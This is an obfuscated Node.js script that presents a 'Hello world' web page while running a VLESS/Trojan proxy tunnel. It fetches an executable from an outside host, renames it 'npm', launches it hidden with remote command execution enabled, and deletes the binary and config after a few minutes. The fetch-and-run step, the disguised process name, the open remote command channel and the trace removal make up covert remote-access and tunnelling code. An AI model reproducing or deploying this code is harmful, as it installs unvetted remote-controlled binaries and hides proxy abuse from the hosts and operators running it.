const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'b7ed2770-aae6-4fa8-8356-7a61a2819d4f',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',NAME=process['env']['NAME']||'',PORT=process['env']['PORT']||0xbb8;let ISP='';const GetISP=async()=>{try{const Y=await axios['get']('https://speed.cloudflare.com/meta'),k=Y['data'];ISP=(k['country']+'-'+k['asOrganization'])['replace'](/ /g,'_');}catch(F){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((Y,k)=>{if(Y['url']==='/'){const F=path['join'](__dirname,'index.html');fs['readFile'](F,'utf8',(G,e)=>{if(G){k['writeHead'](0xc8,{'Content-Type':'text/html'}),k['end']('Hello\x20world!');return;}k['writeHead'](0xc8,{'Content-Type':'text/html'}),k['end'](e);});return;}else{if(Y['url']==='/'+SUB_PATH){const G=NAME?NAME+'-'+ISP:ISP,e='vless://'+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+G,i='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+G,b=e+'\x0a'+i,X=Buffer['from'](b)['toString']('base64');k['writeHead'](0xc8,{'Content-Type':'text/plain'}),k['end'](X+'\x0a');}else k['writeHead'](0x194,{'Content-Type':'text/plain'}),k['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(Y){return new Promise((k,F)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](Y)){k(Y);return;}let G=0x0;function e(){if(G>=DNS_SERVERS['length']){F(new Error('Failed\x20to\x20resolve\x20'+Y+'\x20with\x20all\x20DNS\x20servers'));return;}const i=DNS_SERVERS[G];G++;const b='https://dns.google/resolve?name='+encodeURIComponent(Y)+'&type=A';axios['get'](b,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](X=>{const M=X['data'];if(M['Status']===0x0&&M['Answer']&&M['Answer']['length']>0x0){const D=M['Answer']['find'](C=>C['type']===0x1);if(D){k(D['data']);return;}}e();})['catch'](X=>{e();});}e();});}function handleVlessConnection(Y,k){const [F]=k,G=k['slice'](0x1,0x11);if(!G['every']((C,q)=>C==parseInt(uuid['substr'](q*0x2,0x2),0x10)))return![];let e=k['slice'](0x11,0x12)['readUInt8']()+0x13;const b=k['slice'](e,e+=0x2)['readUInt16BE'](0x0),X=k['slice'](e,e+=0x1)['readUInt8'](),M=X==0x1?k['slice'](e,e+=0x4)['join']('.'):X==0x2?new TextDecoder()['decode'](k['slice'](e+0x1,e+=0x1+k['slice'](e,e+0x1)['readUInt8']())):X==0x3?k['slice'](e,e+=0x10)['reduce']((C,q,m,P)=>m%0x2?C['concat'](P['slice'](m-0x1,m+0x1)):C,[])['map'](C=>C['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';Y['send'](new Uint8Array([F,0x0]));const D=createWebSocketStream(Y);return resolveHost(M)['then'](C=>{net['connect']({'host':C,'port':b},function(){this['write'](k['slice'](e)),D['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](D);})['on']('error',()=>{});})['catch'](C=>{net['connect']({'host':M,'port':b},function(){this['write'](k['slice'](e)),D['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](D);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(Y,k){try{if(k['length']<0x3a)return![];const F=k['slice'](0x0,0x38)['toString'](),G=[UUID];let e=null;for(const q of G){const m=crypto['createHash']('sha224')['update'](q)['digest']('hex');if(m===F){e=q;break;}}if(!e)return![];let i=0x38;k[i]===0xd&&k[i+0x1]===0xa&&(i+=0x2);const b=k[i];if(b!==0x1)return![];i+=0x1;const X=k[i];i+=0x1;let M,D;if(X===0x1)M=k['slice'](i,i+0x4)['join']('.'),i+=0x4;else{if(X===0x3){const P=k[i];i+=0x1,M=k['slice'](i,i+P)['toString'](),i+=P;}else{if(X===0x4)M=k['slice'](i,i+0x10)['reduce']((O,n,K,W)=>K%0x2?O['concat'](W['slice'](K-0x1,K+0x1)):O,[])['map'](O=>O['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),i+=0x10;else return![];}}D=k['readUInt16BE'](i),i+=0x2;i<k['length']&&k[i]===0xd&&k[i+0x1]===0xa&&(i+=0x2);const C=createWebSocketStream(Y);return resolveHost(M)['then'](O=>{net['connect']({'host':O,'port':D},function(){i<k['length']&&this['write'](k['slice'](i)),C['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](C);})['on']('error',()=>{});})['catch'](O=>{net['connect']({'host':M,'port':D},function(){i<k['length']&&this['write'](k['slice'](i)),C['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](C);})['on']('error',()=>{});}),!![];}catch(O){return![];}}wss['on']('connection',(Y,k)=>{const F=k['url']||'';Y['once']('message',G=>{if(G['length']>0x11&&G[0x0]===0x0){const e=G['slice'](0x1,0x11),i=e['every']((b,X)=>b==parseInt(uuid['substr'](X*0x2,0x2),0x10));if(i){!handleVlessConnection(Y,G)&&Y['close']();return;}}!handleTrojanConnection(Y,G)&&Y['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const Y=os['arch']();return Y==='arm'||Y==='arm64'||Y==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const Y=getDownloadUrl(),k=await axios({'method':'get','url':Y,'responseType':'stream'}),F=fs['createWriteStream']('npm');return k['data']['pipe'](F),new Promise((G,e)=>{F['on']('finish',()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',i=>{if(i)e(i);G();});}),F['on']('error',e);});}catch(G){throw G;}},runnz=async()=>{try{const F=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(F['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(G){}await downloadFile();let Y='',k=['443','8443','2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const i=k['includes'](NEZHA_PORT)?'--tls':'';Y='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+i+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',X=k['includes'](b)?'true':'false',M='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+X+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',M);}Y='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(Y,{'shell':'/bin/bash'},D=>{if(D)console['error']('npm\x20running\x20error:',D);else console['log']('npm\x20is\x20running');});}catch(D){console['error']('error:\x20'+D);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN)return;const Y='https://'+DOMAIN+'/'+SUB_PATH;try{const k=await axios['post']('https://oooo.serv00.net/add-url',{'url':Y},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(F){}}const delFiles=()=>{fs['unlink']('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
